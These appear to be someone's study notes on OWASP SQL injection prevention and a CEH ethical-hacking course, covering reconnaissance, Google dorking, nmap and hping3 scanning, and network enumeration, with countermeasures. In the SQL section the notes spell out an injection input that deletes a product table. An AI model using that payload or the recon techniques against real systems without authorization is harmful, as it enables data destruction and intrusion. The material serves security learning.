@@ -1,0 +1,5047 @@
+OWASP:
+1. Injection
+Sql injection:
+to read about SQL injection attacks:
+- Types of SQL injection attacks
+- To read about Bind variables in the DB
+https://www.ibm.com/developerworks/library/se-bindvariables/index.html
+
+How to avoid sql injections?
+- avoid Dynamic query building(by avoiding String concatination)
+- if there is not other go; do it by using Bind variables 
+   When a bind variable is passed as an argument to an SQL prepared statement, 
+	it is automatically escaped by the JDBC driver. 
+
+Listing 20. Bind variables in SQL*Plus(:= 10)
+SQL> variable deptno number
+SQL> exec :deptno := 10
+SQL> select * from emp where deptno = :deptno;
+-----------------------------------------
+
+What can cause SQL Injection?
+Building sql statement dynamically, by concatenating strings can cause sql injections
+
+How to avoid sql injections?
+2 Ways to avoid sql injection
+
+Use Parameterized queries
+ or
+Use Stored Procedures
+
+1..Building SQL statment dynamically and concatinating the string
+SqlCommand cmd = new SQLCommand("Select * from tblProduct where Name = '"+ TextBox1.Text + "'", con)
+
+--attack inviting string
+'"+ TextBox1.Text + "'"
+select * from tblProduct where Name = 'Pens'
+
+------------------------
+
+in user input box user can enter
+Pen --- no attack
+in the given text box enter:
+	Pen'; delete from tblProduct --'
+
+To avoid SQL injection this issue:
+1. use parameterized query
+2. use stored procedures 
+	1.avoid SQL injuction 
+	2.Avoids N/W traffic
+	3. we can reuse the stored procedures in different placess(code reusability)
+	4. improves performance - as adhoc queries has to create a execution plan every time before executing the actual command this can be avoided if we are using stored procedures
+		Stored procedure:
+		Create Proc spGetProductByName
+		@Name varchar(30)
+		as 
+		Begin 
+			select * from tblProducts where Name = @Name 
+		End
+		
+
+1. use parameterized query
+ - SqlCommand cmd = new SQLCommand("Select * from tblProduct where Name = @Name",con);
+   cmd.Parameters.ADD(new SQLParameter("@Name",TextBox1.Text));
+
+-- @Name -- is a parameter
+
+2. use stored procedures 
+	1.avoid SQL injuction 
+	2.Avoids N/W traffic
+	3. we can reuse the stored procedures in different placess(code reusability)
+	4. improves performance - as adhoc queries has to create a execution plan every time before executing the actual command this can be avoided if we are using stored procedures
+		Stored procedure:
+		Create Proc spGetProductByName
+		@Name varchar(30)
+		as 
+		Begin 
+			select * from tblProducts where Name = @Name 
+		End
+
+	in C# code
+	--------------
+	SqlCommand cmd = new SQLCommand("spGetProductByName",con);
+	cmd.CommandType = CommandType.StoredProcedure;
+  	cmd.Parameters.ADD(new SQLParameter("@Name",TextBox1.Text));
+---------------------------------
+Next to go about:
+Free cource:
+CEH v9 (Certified Ethical Hacker)
+https://www.youtube.com/watch?v=IV2ddIMQL3Y&list=PLib7LoYR5PuAdDhgQhjZJvcC8ZbdjyM2n
+
+Ethical-Hacking cource in Udemy:
+https://www.udemy.com/learn-website-hacking-penetration-testing-from-scratch/
+----------------------------------	
+
+CEH v9 (Certified Ethical Hacker)
+===========================================
+https://www.youtube.com/watch?v=IV2ddIMQL3Y&list=PLib7LoYR5PuAdDhgQhjZJvcC8ZbdjyM2n
+
+Video1:
+Ethical Hacking:
+Essential Terminology: --- by Manindra Simhadri
+----------------
+Hack Value - The notion among hackers that something is worth doing.
+-----------
+Vulnerability - Weakness in a system. ex- S/w or HW vulnerabilities
+-------------
+Exploit - A method to intrude/Penetrate in a system
+-------------
+PayLoad - Maliciour code inside exploit is call payload
+---------
+Zero Day Attack - When a hacker finds a new vulnerability in a system and no-one other know about it, that vulnerability/exploit is called 0-day attack
+--------------
+Doxing - when a hacker publishes some personal information regarding any individual. that is called doxing
+------
+Bot - a bot is a s/w or Hw, when it installs in a computer, a hacker can gain access remotely to a system
+-----
+
+Hacking - Hacking is defined as a process in which hackers use advantage of vulnerabilities of the system to intrude/penetrate in that system locally/remotely
+---------
+Hacking can be used to steal or share private content of individual/a company.
+
+Hacker Classes
+-----------------
+Black Hat hackers - The hacker who have excellent computing skills and the most talented hackers in the world.
+			They do hacking for illegal purposes. That's why they are called black hat hackers.
+White Hat Hackers - They are professional hackers who in industry. They are alos called Ethical hackers.
+			They work for legal purposes. They secure n/w / Web of the company. companies hire white hat hackers
+Gray hat hackers - These hacker work both sides like they work legal as well as for illegal purposes. That's Why they are called Gray Hat hackers.
+
+
+Suicide Hackers - These Type of hackers don't care about the result of hacking. They just want to hack the system and don't care abot prison
+Script Kiddies - Theses Hackers are beginners in hacking industry. They are not familiar with programming/coding skills and just run s/w / tools created by others
+Hacktivist - Those hackers who promote hacking on social sites like facebook. LinkedIn etc. are called hacktivists.
+
+**Phases of Hacking - ***
+----------------------
+There are 5 type of steps in hacking which is following - 
+- Reconnaissance or Information gathering(finding information about the target)
+- Scanning(scan the Target)
+- Gaining Access
+- Maintaining Access
+- Covering Tracks
+
+Video2:
+=============================
+Ehical Hacking:
+- Ethical hacking contains the methods to find vulnerabilities in a system and perform exploits to intrude in a system in legal way
+- Hackers attack on a system and Ethical hackers secure a system from hackers that's why They work in industry
+
+Why Ethical hacking is necessary for Industry???
+
+- To find Vlunerabilities in the N/w / Web in an organization
+- what can a Hacker do with the information???
+- How much effort/Money is requred to patch the system
+- How to Grab ip addresses of Hackers
+- Get Ready for next attack in the system
+
+Skills of an Ehtical hacker
+- There are 2 types of skill and ethical hacker should contain -
+- Technical Skills - 
+Depth Knowledge of OS ex- Windows, Linux os
+knowledge of n/w is must
+Knowledge of security Areas is good
+High Technical knowledge
+
+- Non Technical Skills
+Ability ot learn some new Technology
+Good Problem Solving Skills
+Work under Ethic Policies.
+Awareness of laws and Standard
+
+Threat Modeling:
+------------------
+Threat modelling is a risk assessment approach for analysing security of an organization by capturing all the information that can effect the organization security.
+Steps of Threat Modelling-
+-----
+-identify security objectives
+-Application Overview
+-Identify Vulnerabilities
+-Decompose Application
+-Indentify Threats
+
+Types of Security Policies in companies:
+-----------------------------------------
+-Promiscuous Polity
+  no restriction on systems
+-Permissive policy
+  Only Dangerous services are blocked in organization
+- Prudent Policy-
+ maximum security in a company
+-Paranoid Policy - 
+ Everything is blocked in company. ex-No internet Connection
+
+Vedio 3:
+=============
+Vulnerability Assessment(VA)
+----------------------------
+what is VA??
+- Vulnerability Assessment is process to find loop holes/vulnerabilities in a system / network of the organization
+-VA can be used to identify system weakness that can be exploited by hackers and VA is prediction of security in the org.
+
+Vulnerability Research-
+---------------------------
+-Vulnerability Research is a process of discovering loop holes/vulnerabilities in application and os like windows, Linux etc
+-Vulnerabilities are divided into 3 parts-
+ - Low Vulnerability(Green)
+ - Medium Vulnerability(Yellow)
+ - High Vulnerability(Red)
+
+Penetration Testing(PT)
+----------------------------
+-Penetration testing is next step of Vulnerability assessment(VA)
+-In VA step hackers discovers Vulnerability in the system and in Penetration Testing step, They use those Vulnerabilities found in VA step and try to intrude/penetrate in the system.
+-PT team works with VA team to complete the project.
+-PT team creates Final Report that can be sent to the Client.
+-PT team is most talented than VA team.
+
+Securtity Audit-
+-----------------
+what is Security Audit?
+- Security Audit is a process of checking h/w / S/w working in the organization.
+- Security Audit check whether the org is working legally or not. They also checks whether Company is working under Proper Lows/ Policies or not
+
+Blue Team and Red Team:
+-------------------------
+Blue Team - VA Team
+Red Team - PT team
+Blue team has access of all resources of org and Red Team contains very less acess to the resources of org
+
+Penetration Testing Types:
+--------------------------
+Black Box Testing
+White box testing
+Grey box testing
+
+Black Box - no prior knowledge of n/w
+White Box - complete knowledge of n/w
+Grey Box - limited knowledge of n/w
+
+Vedio 4:
+==============
+Methodologies of Security Testing:
+-----------------------------------
+- Security Testing is a methodology to find vulnerabilities and secure them using ethical hacking Techniques.
+- OWASP - Open Web Application Security Project
+	- The OWASP Top 10 Web Application Security Ricks for 2010 are:
+	A1: Injection
+	A2: Cross-site scripting
+ 	A3: Broken Authentication and Session Management
+	A4: Insecure Direct Object References.
+	A5: Cross-Site Request Forgery(CSRF)
+	A6: Security Misconfiguration
+	A7: Insecure Cryptographic Storage
+
+Laws and Standards:
+-------------------------
+- Payment card Industry(PCI-DSS)
+- PCI-DSS is a standard for payment card companies that handle information of debit, credit, e-purse etc.
+- Standards - 
+	- Build a secure n/w 
+	- Regular monitor n/w
+	- Maintain information security laws and standards
+
+Laws and Standards-
+-----------------------
+ISO 27001
+---
+Iso 27001 defindes the requiremnets of establishment, maintaining and improving information security system of a company
+Standars -
+	- identify information security management process
+	- status of information security management process.
+	- define new laws and standards in company.
+	- Cost effectively managemnet
+HIPPA(Health Insurance Portability and Accountability Act)
+---
+Standards of HIPPA
+	- Electronic Transaction in Health Org
+	- Some privacy rules to protect personal helth information
+	- Health care providers should have national numbers.
+DMCA(Digital Millennium Copyright Act)-
+---
+ - it is a US based copyright act. which hold by World's Intellectual Properties Org(WIPO)
+ - This act has been created for content owners to preserve their content from other users. If a documents has copyright laws, other than owner can not share, replicate or remove the content.
+FISMA(Federal Information Security ManagementAct)
+---
+ - It provides a framework to ensure the effectiveness of information security controles over information resources which is supported by Federal Managements.
+Standards-
+ - Categorizing information and information systems.
+ - Minimum security requirements.
+ - Guidance for proper security law.
+
+Video5:
+========
+info on Kali linux
+Applications in Kali:
+01- Informatiion Gathering -- on internet 
+--------------
+recon-ng> -- used to find out info on target on internet, it is useful in finding exact location of a server (like street, country), we can find ip, latitued, logitude, country
+recon-ng> keys add
+> keys add filckr_api
+>workspace list
+>workspaces remove kali.org
+>workspaces delete kali.org
+>workspaces list
+>workspaces add kali.org
+>workspaces list
+> show domains
+> help
+> show
+> show keys
+> type modules
+> show domains
+> load netcraft -- to find info on target
+> show options
+> set SOURCE kali.org
+> show options
+> show domains
+> run
+> show hosts
+> load resolve
+>use recon/hosts-hosts/resolve
+> show options
+> run
+> show hosts
+> load freegeoip
+> show options
+> run 
+> show hosts
+to find the suite addres of perticular ip address
+> show locations
+> add locations
+ > :45.22  ---latitude
+ > :45.6  -- longitude
+> load reverse_geocode
+> show options
+> run
+
+
+>workspaces list
+>workspaces add yahoo.com
+> load netcraft
+> show options
+> set SOURCE yahoo.com
+> run
+> show hosts -- to list the table
+> load resolve
+> use recon/hosts-hosts/resolve -- funds the ip address
+> show options
+> run
+> show hosts
+
+
+----
+> load freegeoip
+> show options
+> run 
+
+above commands are not working
+-----
+Video 7: install Kali linux
+
+Video 8: - information gethoring
+=================================
+Uses of Information Gathering:
+---------------------------------
+it allows a hacker to  gain information about the target sys. 
+This information can be used to carry out further attacks on the system. 
+That is the reason by which it may be named as Pre-Attack.
+since all the information is reviewed in order to get a complete and successful resolution of the attack.
+
+Information via Information Gathering Steps:
+----------------------------------------
+-Know infrastructure
+-Reduce focus area of attack
+-Gather Vulnerabilities
+-Network Map Drawing
+
+Objective of Information Gathering:
+------------------------------------
+- Collect N/w information - Domain Name, Networking protocols
+- Collect System Information - Passwords, User groups
+- Collect Company's Information - Employee Details, Address, Phone Numbers
+
+first step in information Gathering
+- FootPringing through search Engines
+- Attachers use search engines to extract information about the target such as technology
+ platforms, employee details, login pages, intranet portals, etc, which helps in performing social engineering and other types of advanced system attacks.
+- Search engine cache may provide sensitive information that has been removed from the www.
+
+PIPL.com
+-----
+you can search for Name, Email,User, Name, Phone and find related results.
+The results can be very noisy, with links to a bunch of paid sits, but if you are willing to sort though the crap it's pretty nice.
+i like what is shows from public records, Amazon profiles, and social neworks
+
+visit - http://www.pipl.com
+
+FootPrinting Through job Sites
+------------------------------
+Examples of job websites
+----
+Linkedin.com
+monster.com
+indeed.com
+
+you can gather company's infrastructure details using job postings
+
+look for these details-
+---
+Job requirements
+Employee's profile
+H/w information
+
+
+Video 09
+==============
+Inforamtion gathering using Google hacking Techniques:
+-----------------------
+- By using the basic search technique combined with Google's advanced operators, anyone can 
+perform information-gathering and vulnerability-searching using Google.
+This technique is commonly referred to as Google hacking
+
+-Site Mapping
+- inurl:site php?id=
+- Site:target php?id=
+
+Mirroring entire Website:
+-------------------
+- Web mirroring tools allows you to download a website to a local directory,
+building recursively all directories HTML images, Flash, Videos from the server to your computer.
+
+Website Mirroring Tools:
+1. Httrack Website Copier(http://ww2.htttrack.com/)
+2. KEEPNI(http://www.keepni.com/)
+
+Mirroring Entire Website tools:
+1. Wget (http://www.gnu.org/)
+2. teleport pro (http://www.tenmax.com/)
+
+> Extract website information from http:/archive.org/index.php
+> as well as you can monitor web updates using website watcher.
+
+Information gathering via Email:
+-------------
+Email Tracking Tools-
+----
+1. email tracker pro(http://www.emailtrackerpro.com/)
+2. didtheyreadit (http://www.didtheyreadit.com/)
+3. Trout (http://www.foundstone.com/)
+
+Competitive Intelligene
+---------------------
+-Pinpoint your cometitors locations to strategically place new establishments for your business
+-Target competitors by chain name, segment or menu type to view density of restaurants in any geographic market
+- View your store penetration in target location by State, City, Country, MSA, Zip code or Radius level
+- Perform market analytics on target geographies or restaurant type
+- Visualize density of independents and chain locations within a given market
+- View cnesus demographics for your geographic selection, in order to see the footprin of consumers in any given geography
+
+Video 10:
+=================
+information gathering
+===========
+
+WHOIS TOOLS FOR INFORMATION GATHERING-
+
+Whois Lookup tools for PC - 
+-------------
+- Whois lookup
+- Activewhois
+- whoisthisdomains
+- Hotwhois
+
+Whois Lookup tools for mobile
+---------------
+-DNS tools
+- Ultra Tools Mobile
+- WhoisLookup Tools
+
+DNS FOOTPRINGING-
+----------
+- when i am trying to footprint a n/w i am often only given a domain name and i want to know DNS name and IP addresses associated with that domin name.
+in addition, i want to know about the n/w blocks those IP addresses belong to and other servers that may be in those n/w blocks.
+
+- DNS Interrogation - 
+- After gathering the information needed using the above techniques, a hacker would begin to query the DNS using tools.
+ a common proble, with system administrators is allowing untrusted, or worse, unknown users, to perform a DNS zone transfer.
+Many freeware tools can be found on the internet and cona be used to perform DNS interrogation. 
+Tools such as nslookup, for PC, and AGnet tools
+
+LOCATE THE NETWORK RANGE-
+--------------------------
+- Using Tracert to Find Out Hop IP addresses
+-To find out the IP addresses of hops b/w the machine running IPCheck and a server you want to monitor run the "tracert (yourservername)"
+command on the machine running IPCheck:
+
+C:\tracert www.paessler.com
+Trace route to WWW.paessler.com[72.3|42.92] with max. 30 hops:
+
+Choose one of the hops to monitor. often it is a good idea to talk to your provider with IP address is a good choice
+
+
+TRACEROUTE TOOLS:
+----------------------
+- Path Analyzer Pro
+- VisualRoute
+- 3D-Traceroute
+- GEOSpider
+- Ping Plotter
+- vTrace
+- Network Pinger
+
+INFORMATION GATHERING USING SOCIAL ENGINEERING-
+-----------------------------------------------
+- Social engineering in the context of information security,refers to psychological manipulation of people into performing actions
+or divulging confidential information. a type of confidence trick for the purpose of information gathering, fraud, or system access, it differs
+from a traditional "con" in that it is often one of many steps in a more complex fraud scheme.
+
+Social Engineering Techniques-
+------------------------------
+-Phising: Phishing is a technique of raudulently obtaining private informaiton.
+Typically, the phisher sends and e-mail that appears to come from a legitimate business- a bank,
+or credit card company- requesting "verification" of information
+and warning of some dire consequence if it is not provided
+
+-Eaverdropping - Unauthorized listening of Conversation
+- Shoulder Surfing -Attackers secretly observe the target.
+- Dumpster Diving - Looking for treasure in someone else trash
+
+
+Video 11:
+===============
+INFORMATION GATHERING TOOLS:
+--------------------
+MALTEGO
+---------
+- Maltego is proprietary s/w used for open-source intelligence and forensics, developed by Paterva.
+  Maltego focuses on providing a library of transforms for discovery for discovery of data from open sources and visualizing that information in a graph format,
+  suitable for link analysis and data mining.
+
+Recon-ng
+---------
+in recent years, a brand new reconnissance framework has become avaliable to us that leverages many of the tools we are already using,
+but makes far more powerful. This tool, Recon-ng, was developed by Tim Tomes while at Black Hills information Security. He developed it as a Python script and tried to model its usage after Metaspoit,
+making it easy for a pentester with Metasploit skills to use Recon-ng. it is built into Kali, so there's no need to download or install anything.
+
+Kali> recon-ng
+
+-FOCA - (Fingerprinting Organiztions with Collected Archives) - 
+--------
+-FOCA(fingerprinting Organizations with Collected Archives) is a tool used mainly to find
+metadata and hidden information in the documents its scans.
+These documents may be on web pages, and can be downloaded and analyzed with FOCA.
+-It is capable of analyzing a wide variety of documents, with the most common being Microsoft
+Office, Open Office, or PDF files, although it also analyzes Adobe InDesign or SVG files. for instance.
+-These documents are searched for using three possible search engines: Google, Bing, and EXalead.
+The sum of the reuslts from the three engines amountes to a lot of dcuments.
+it is also possiblel to add local files to extract the EXIF information from graphic files, and a complete analysis of the 
+information discovered through the URL is conducted even before downloading the file.
+- With all data extraced from all files, FOCA matches information in an attempt to identify which documents have been created by the same
+team and what server and clients may be infered from them.
+
+COUNTERMEASURES OF INFORMATION GATHERING - 
+-Restrict Employees to access social n/w websites
+- Educate Employees
+- Do not reveal sensiive information in press
+- Educate Employees about Social Engineering Techniques
+-Encrypt and password protection Techniques
+
+Video 12:
+================
+Information Gathering Practical1:
+
+in google search for 
+-------
+whois
+who.is --- we can search information about website
+
+
+Video 13:
+============
+Pipl.com -- to find info about the pepole
+
+Video 14:
+=============
+yougetsignal.com --- 
+
+Video 15:
+===============
+Scanning Part 1:
+-------------------
+What is SCANNING
+-----------
+N/W scanning refers to the use of a computer n/w to gather information
+regarding computing sys.N/w scanning is mainly used for security assessment.
+sys maintenance, and also for performing attacks by hackers.
+Recognize available UDP and TCP n/w services running on the targeted hosts.
+
+Goals of SCanning:
+------
+find the Open ports
+
+- N/w Port
+- A numeric identifier used to distinguish b/w different n/w services(ie HTTP,Telnet,FTP) on the same computing system.
+ Althrough port numbers range from 0 to 65536, many well known services have reserved port numbers b/w 0 and 1024(ie HTTP uses port 80, Telnet-23, FTP-20 and 21)
+To establish a session with a host, a n/w request must be sent to the appropriate port no. on the host. 
+That is, to establish an HTTP session with  web server, your workstataion s/w will send a request to port 80 of the web server.
+N/w Port Scanning
+-The process of sending data packets over the n/wto selected service port numbers(HTTP-80, Telnet-23 etc.) of a computing sys with the purpose of identifying 
+available n/w services on that system. this process is helpful for troubleshooting sys problems or tightening sys security.
+N/w port scanning is an information gathering process, and when performed by unknown individuals it is considered a prelude to attack.
+
+COMMUNICATION FLAGS(TCP flags)
+---------------
+-SYS - To create connection
+-PSH - push data from buffer
+-ACK - get acknowledgement from server
+-URG - send urgently packets
+-FIN - finish the connection
+-RST - reset a connection
+
+3-Way-HANDSHAKING
+------------------
+A three-way handshake is a method used in a TCP/IP n/w to create a connection b/w a local host/client and server.
+It is a three-step method that requires both the client and server to exchange SYS and ACK packets befor actual data communication begins
+
+	  initiator		Listener
+Connect()    |			  | Listen()
+	     |		SYN	 >|
+ 	     |			  |TCP initialized to SYN-RECEIVED state
+Success code |			  |	
+returned by  |			  |
+connect()    |<SYN-ACK 		  |
+	     |		     Ack >|TCP transitions to EStablished state
+	     |			  | 	
+
+CREATE A SINGLE PACKET
+---------------------
+- Colasoft Packet Builder enables creating custom /w packets; users can use this tool
+to check their n/w protection against attacks and intruders. ColaSoft Packet Builder
+includes a very powerful editing feature. Besides common HEX editing raw data, it features a 
+Decoding Editor allowing users to edit specific protocol field values much easier.
+
+
+Video 16:
+==========
+Scanning part 2:
+-----
+CHECK LIVE SYSTEMS IN N/W
+--------------------------
+Enter the Ping command.
+Type ping hostname or ping IP address
+
+- a hostname is typically a website address. Replace hostname with athe website that or server that you want to ping.
+For example, to ping wikiHow's main webserver, type ping www.wikihow.com
+-An Ip address is a computers location on a n/w, either locally or on the internet. if you know the IP address that you want to ping,
+replace IP address with it. for ex: to ping the IP address 192.168.1.1 type ping 192.168.1.1
+
+SCAN A RANGE(PING SWEEP)-
+-----------------------------
+- In computing,a scan a range of ip addressess is a method that can establish a range of IP addresses which map to live hosts.
+The classic tool used for ping sweeps is fping, which traditionally was accompanied by gping to generate the list of hosts for large subnets, although
+more recent version of fping include that functionality.
+
+- There are a number of tools that can be used to do a ping sweep, such as fping, gping, and nmap
+for unix sys, and the Pinger s/w from Rhino9 and ping Sweep from SolarWinds for Windows sys. Both Pinger and Ping Sweep send muliple packets at the same time
+and allow the user to resolve host names and save output to a file
+
+TOOLS FOR PING SWEEP-
+-------------------------
+-Angry IP scanner   --inportant
+-Nmap   -- inportant
+-Zenmap
+-Solarwinds Engineers Toolsets
+-Advance IP Scanner
+-Oputils
+
+WHAT ARE PORTS IN N/W
+-------------------------
+-IN the internet protocal suite,  a port is an endpoint of communication in an OS.
+While the term is also used for female connectors on h/w devices(see computer port).
+in s/w it is a logical construct that identifies a specific process or a type of n/w service.
+
+FTP -21
+SSH - 22
+Telnet - 23
+WHOIS -43
+DNS - 53
+SMTP - 25
+POP3 - 110
+SNMP -161
+MYSQL - 3306
+
+SCANNING S/W OR TOOL -
+-------------------------
+Nmap (n/w Mapper)is a security scanner, originally written by Gordon Lyon (also known by his psudonym Fyodor Vaskovich) used to discover hosts and services on a computer n/w, thus building a "map" of the n/w
+
+- Bydefault hping3 is loaded with Backtrack 5 and Kali Linux distros.
+-1) Command to check port no.
+- hping3 -s http://www.neelpathak.in -p 80 -c 2 (SYN reg. -c = count)
+-2)Command to check series of ports
+-hping3 -S 192.168.1.7 -p ++50 -c 5 (SYN req, starting with port 50 as a destination port, -c = count)
+- Giving the destination ports if they are open then they will reply on our ports...P, if the plags we get are RA then the ports are closed.
+
+Video 17:
+===============
+SCANNING IN NMAP -***
+--------------------
+UDP SCAN-
+-----
+Nmap -sU Targetipaddress
+
+STEALTH SCAN - 
+------------
+Nmap -sS targetipaddress
+
+PING SCAN - 
+------------
+Nmap -sn targetipaddress
+
+NO PING SCAN-
+----------------
+Nmap -Pn targetipaddress
+
+REGULAR SCAN - 
+---------------
+Nmap targetipaddress
+
+XMAS SCAN - 
+----------------
+Nmap -sX targetipaddress
+
+SCAN TOOLS:
+---------------
+-NETSCANTOOLS PRO - 
+------
+This tools is used to trubleshoot, Monitoring, diagnosting n/w within a company.
+
+SCANNING S/W FOR MOBILES
+----------------------------
+-IP Network Scanner
+-Fing
+-Network Discovery
+-Pamn IP Scanner
+-PortDroid N/w Analysis
+
+WHAT IS BANNER GRABBING
+--------------------------
+(**operating system detection)
+-Banner grabbing is a technique used to clean information about a computer sys on a
+n/w and the services running on its open ports. Administrators can use this to take inventory of the sys and services on their n/w
+
+-Tools-
+-------
+ID Serve
+Netcraft
+Netcat
+Telnet
+
+Video 18:
+==============
+SCAN VULNERABILITY IN NETWORK-
+----------------------
+s/w which finds vulnerability in the system.
+A vulnerability scanner is a computer program designed to assess computers, computer
+systems, n/w or applications for weaknesses.. They can be run either as part of vulnerability management
+by those tasked with protecting sys - or by black hat attackers looking to gain unauthorized access
+
+OBJECTIVE OF NETWORK SCANNING
+------------------------------
+-To find Network Vulnerabilities.
+-To Find Open ports and running processes in Computer.
+-To find Applications and services running on computer
+-Errors regarding applications.
+-List out Vulnerabilities in computer
+
+VULNERABILITY SCANNING TOOLS:
+--------------------------------
+-Nessus-
+-Nessus is a proprietary vulnerability scanner developed by Tenable N/w Security. It is free of charge for personal use in a non-enterprise env.
+
+-Operation:
+-Nessus allows scans for the following types of vulnerabilities
+-Vulnerabilities that allow a remote hacker to control or access sensitive data on a system.
+-Misconfiguration(eg: open mail relay, missing patches etc..)
+- Default passwords, a few common passwords, and blank/absent passwords on some system accounts.
+Nessus can also call Hydra(an external tool) to launch a dictionary attack.
+-Denials of service against the TCP/IP stack by using malformed packets
+- Preparation for PCI DSS audits
+
+GFILanguard - 
+---------------------
+GFI LanGuard is a leading n/w security scanner and patch management solution that acts
+as a virtual security consultant. It gives you a complete picture of your n/w setup, provides
+risk analysis and helps you maintain a secure and compliant n/w with minimal effort.
+
+VULNERABILITY SCANNER FOR MOBILE - 
+-------------------------------------
+- Retins CS
+- Security Metrics Mobile Scan
+- Nessus
+- GFILanGuard
+
+
+Video 19:
+============
+Scanning Part 5:
+
+DRAW NETWORK DIAGRAMS - 
+---------------------------
+-Drawing Network Diagrams will give you brief information about n/w topology and architecture to the attacker.
+-Network Discovery Tool - 
+  - Network Topology Mapper
+  - Op-Manager
+  - Network View
+  - The Dude
+  - Net Mapper
+
+NETWORK DISCOVERY TOOLS FOR MOBILE - 
+----------------------------------------
+-Scany
+-Net Master
+- Swiss-Army-Knife
+
+PROXIES -
+--------------
+-An application thata can serve as mediator b/w computer and www is called Proxy.
+Why use proxy?
+-To hide actual IP address.
+-To interrupt services in a n/w
+-To remote access intranets
+-To mask the actual source
+
+PROXY CHAINING-
+---------------
+Refer notes
+2 or more proxy servers available b/w you and your TARGET this is called as Proxy chaining
+You -->Proxy1->Proxy2
+		|
+TARGET<-Proxy4<-Proxy3	
+
+PROXY TOOLS/SOFTWARES-
+----------------------------
+-Proxy Switcher
+- Proxy Workbench
+-Tor  --browser
+-CyberGhost
+-SocksChain
+-Fiddler
+-ProxyCap
+-CCProxy
+-Burp Suite
+
+PROXY TOOLS FOR MOBILE:
+------------------------
+-Proxy Browser
+- ProxyDroid
+-NetShade
+-Tails
+-G-Zapper
+-GuardSter
+- Proxify
+-Head Proxy
+-Hope Proxy
+
+-Orbot -- instructor was using this
+
+
+Video 20:
+---------
+WHAT IS DEEP LEAVEL SCANNING
+----------------------------
+-Network enumeration is a computing activity in which username and info on groups, shares,
+and services of networked computers are retrieved. It should not be confused with n/w mapping,
+which only retrieves information about which servers are connected to a specific network and what operating sys runs on them.
+- Enumeration means to identify the user account, sys account and admin account. Enumerating windows active directory to find out these stuffs.
+
+OBJECTIVES OF DEEP SCANNING-
+-------------------------------
+-Network shares
+-SNMP data.if they are not secured properly
+-IP tables
+- Usernames of different systems
+-Passwords policies lists
+
+TYPES OF DEEP SCANNNING:
+--------------------------
+-DNS enumeration
+-NTP enumeration
+-SNMP enumeration
+-Linux/Windows enumeration
+-SMB enumeration
+
+NETBIOS DEEP SCANNING:
+------------------------
+- NetBIOS Enumeration And Null session. Net BIOS null Sessions occurs when you connect any
+remote system without user-name and password. It is usually found in system with Common Internet File System(CIFS)
+or Server Message Block(SMB)depending on operating sys.
+
+NETBIOS SCANNING TOOLS:
+--------------------------
+NetBIOS Enumeration Tools:
+----------
+The following table shows the list of tools to perform NetBIOS Enumeration
+01 Nbtstat  www.technet.microsoft.com
+02 SuperScan http://www.mcafee.com/in/downloads/free-tools/superscan.aspx
+03 Hyena http://www.systemtools.com/hyena/
+04 Winfingerprint  https://packetstormssecurity.com/files/38356/winfingerprint-0.6.2.zip.html
+05 NetBIOS enumerator http://nbtenum.sourceforge.net/
+
+SNMP DEEP SCANNING-(port 161)
+-------------------------------
+- SNMP stands for Simple Network Management Protocol is am application-layer protocol that runs on User Datagram Protocol(UDP).
+it is used for managing n/w devices which run on IP layer like routers. SNMP is based on a client-server architecture where SNMP client or
+agent is located on every n/w device and communicates with the SNMP managing station
+via requests and responses. Both SNMP request and responses are configureable variables
+accessible by the agent s/w. SNMP contains two passwords for authenticating the agents before configuring the variables
+and for accessing the SNMP agent from the management station.
+
+SNMP Passwords are-
+-Read Community string are public, and configuration of the device can be viewed with this password
+-Read/write community string are private, and configuration of the device can be modified using this password
+-SNMP uses virtual hierarchical database internally for managing the n/w objects, and it is called 
+Management Information Base. MIB contains tree like structure and object ID uniquely
+represenets each n/w object. The n/w objects can be viewed or modified based on the SNMP passwords.
+
+SNMP DEEP SCANNING - (PORT 161)
+-------------------------------
+01 	OpUtils	https://www.manageengine.com/products/oputils
+02	SolarWinds	http://www.solarwinds.com/
+03 	SNScan		http://www.mcafee.com/us/downloads/free-tools/snscan.aspx
+04	SNMP Scanner	http://www.secure-bytes.com/snmp-scanner.php
+05	NS Auditor	http://www.nsauditor.com/
+
+SNMP DEEP SCANNING - (PORT 161) - COUNTERMEASURES -
+----------------------------------------------------
+-Minimize the attack surface by removing the SNMP agents where not needed
+-Change default public community string
+- Upgrade to SNMPv3 which encrypts the community strings and messages
+- Implement group policy for additional restriction on anonymous connections
+- implement firewall to restrict unnecessary connections
+- Implement IPSec filtering
+- Block access to TCP/UDP ports 161
+- Encrypt and authenticate using IPSEC
+
+Video 21:
+---------------
+WHAT IS LDAP-
+-LDAP Stands for Light Weight Directory Access Protocol and it is an Internet protocol for 
+accessing distributed directory services like Active Directory or OpenLDAP etc. A directory
+service is a hierarchical and logical structure for storing records of users. LDAP is based on 
+Client and server architecture. LDAP transmits over TCP and information is transmitted b/w client and server using Basic Encoding Rules.
+ 
+LDAP DEEP SCANNING:
+---------------------
+- LDAP supports anonymous remote query on the server. The query will disclose sensitive
+information such as username, address, contact details, Department details etc.
+
+LDAP DEEP SCANNING TOOLS:
+---------------------------
+01	Softerra LDAP Administrator	http://www.idapadministrator.com/
+02	Jxplorer		http://jxplorer.org/
+03 	active directory domain
+	services management pack
+	for sys center			https://www.microsoft.com/en-in/download/details.aspx?id=21357
+04	LDAP Admin Tool			http://www.idapadmin.org/
+05	LDAP Administrator tool		https://sourceforge.net/projects/idapadmin/
+
+HOW TO SECURE LDAP HACKING-
+------------------------------
+LDAP Security controls:
+- The following are the security controls to prevent LDAP enumeration attacks
+- Use SSL to encrypt LDAP communicaiton
+- Use Kerberos to restrict the access to known users
+- Enable account lockout to restrict brute forcing
+
+NTP - (NETWORK TIME PROTOCOL)
+-----------------------------
+-NTP stands for N/w Time protocol designed to synchronize clocks of n/w
+computers. NTP can achieve accuracies of 200 milliseconds or better in local area n/w
+under ideal conditions. NTP can maintain time to within ten milliseconds (1/100 second) over
+the Internet. NTP is based on agent-server architeccture where agent gueries the NTP server.
+and it works on User Datagram Portocol(UDP) and well-know port 123.
+
+NTP DEEP SCANNING - 
+-------------------
+An attacker can enumerate the following information by querying NTP server.
+- List of hosts connected to the NTP server
+- Internal Client IP addresses, Hostnames and Operating sys used.
+
+NTP SCANNING TOOLS:(COMMANDS)
+--------------------
+01	ntptrace	query to determine from where the NTP
+			server updates its time and traces the chain of
+			NTP servers from a source
+02	ntpdc		Query the ntp Deamon about its current state
+			and to request changes in the state
+03 	Ntpq		Monitors NTP daemon ntpd operations and 
+			determine performance
+
+SECURE NTP-
+-------------
+The following are the security controls to prevent NTP enumeration attacks - 
+-Restrict the usage of NTP and enable the use of NTPSec where possible
+-Filter the traffic with IPTables
+-Enable logging for the messages and events
+
